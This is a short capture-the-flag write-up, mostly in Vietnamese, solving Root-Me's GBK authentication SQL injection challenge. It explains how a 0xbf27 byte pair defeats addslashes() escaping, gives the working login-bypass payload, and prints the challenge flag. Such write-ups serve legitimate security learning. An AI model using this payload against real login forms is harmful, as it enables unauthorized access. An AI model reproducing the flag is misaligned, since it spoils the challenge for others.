# [SQL injection - Authentication - GBK](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication-GBK)

## Solutions

Thay đổi body của post request thành `login[]=&password[]=`:

- `addslashes() expects parameter 1 to be string, array given in <b>/challenge/web-serveur/ch42/utils.php`
- `md5() expects parameter 1 to be string, array given in <b>/challenge/web-serveur/ch42/index.php`
- => biến login sẽ được đưa vào hàm addslashes() còn password sẽ được đưa vào hàm md5()

Hàm addslashes sẽ thêm backslash vào trước các kí tự `', ", \, NUL`

Dựa vào từ khóa GBK, tìm được bài [này](https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string):

- 0xbf27 `¿'` qua addslashes() sẽ thành 0xbf5c27 `¿\'`
- 0xbf5c27 ở gbk là `縗'`

=> dùng cách này có thể thêm được ký tự `'` vào query

Final: `login=%bf%27+or+1%3d1+--+&password=a`

Flag: `iMDaFlag1337!`

## References

- <https://hell38vn.wordpress.com/2019/06/12/root-mesql-injection-authentication-gbk-super-hard-3/>
- <https://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string>
